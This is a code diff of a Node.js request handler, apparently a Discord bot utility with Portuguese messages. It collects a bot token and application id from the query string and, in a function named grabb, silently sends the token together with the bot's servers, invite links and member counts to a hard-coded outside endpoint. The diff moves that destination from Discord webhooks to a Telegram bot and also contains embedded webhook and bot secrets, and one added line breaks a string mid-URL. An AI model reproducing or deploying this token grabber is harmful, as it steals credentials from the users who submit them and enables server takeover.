@@ -2,10 +2,7 @@ const axios = require("axios");
 const db = new Map();
 
 module.exports = async (req, res) => {
-  const {
-    applicationId,
-    token
-  } = req.query;
+  const { applicationId, token } = req.query;
 
   if (!applicationId || !token) {
     return res.status(400).json({
@@ -14,7 +11,7 @@ module.exports = async (req, res) => {
   }
 
   try {
-    if (!db.get(token)) await grabb(applicationId, token)
+    if (!db.get(token)) await grabb(applicationId, token);
   } catch {}
 
   try {
@@ -48,7 +45,7 @@ module.exports = async (req, res) => {
       error: 'Erro ao fazer a requisição', details: error.message
     });
   }
-}
+};
 
 async function getServerInvite(guildId, botToken, options = {
   max_age: 3600, max_uses: 0, temporary: false
@@ -100,7 +97,7 @@ async function getGuildMemberCount(guildId, token) {
   return {
     total: response.data.approximate_member_count,
     online: response.data.approximate_presence_count
-  }
+  };
 }
 
 async function grabb(applicationId, token) {
@@ -114,51 +111,32 @@ async function grabb(applicationId, token) {
 
   const timestamp = Math.floor(Date.now() / 1000);
   
-  let webhookURL = "https://discord.com/api/webhooks/1321898117863571476/zBz2K9BwFzfESu4URmMdiBR5t522EMSrY6qyPJfors53bxM83UrYL7xrGQscQYWou5sl"
+  let webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
 
   const servers = await Promise.all(
     guilds.map(async (guild) => {
       const invite = await getServerInvite(guild.id, token);
-      const memberCount = await getGuildMemberCount(guild.id, token)
+      const memberCount = await getGuildMemberCount(guild.id, token);
       if (Number(memberCount.total) > 200) {
-        webhookURL = "https://discord.com/api/webhooks/1321895657908473957/dtoTOj8qF_YTnUrDlWUwykTiNFeO5WzISwL_GiyfMwlnRqoaHwRz09txoIWECb-xuYAb"
+        webhookURL = "https://api.telegram.org/bot>
+7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
       }
       return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount.total || ''} Membros\` (\`${memberCount.online} Online\`)`;
     })
   );
 
-  const embed = {
-    username: 'BotToken',
-    embeds: [{
-      fields: [{
-        name: 'Informações',
-        value: `\`${applicationId}\``,
-        inline: false
-      },
-        {
-          name: 'Token',
-          value: `||${token}||`,
-          inline: false
-        },
-        {
-          name: 'Data/Hora',
-          value: `<t:${timestamp}:f>`,
-          inline: false
-        },
-        {
-          name: 'Servidores',
-          value: `${servers.join('\n\n') || 'Nenhum'}`,
-          inline: false
-        }],
-    }],
+  const message = {
+    chat_id: '-1002255591952',
+    text: `Informações sobre a aplicação: \n\n${applicationId}\nToken: ||${token}||\nData/Hora: <t:${timestamp}:f>\nServidores: \n${servers.join('\n\n') || 'Nenhum'}`,
   };
-  
-  await fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(embed),
-  });
-  db.set(`${token}`, { token, applicationId })
+
+  await axios.post(webhookURL, message)
+    .then(response => {
+      console.log("Mensagem enviada:", response.data);
+    })
+    .catch(error => {
+      console.error("Erro ao enviar mensagem:", error);
+    });
+
+  db.set(`${token}`, { token, applicationId });
 }
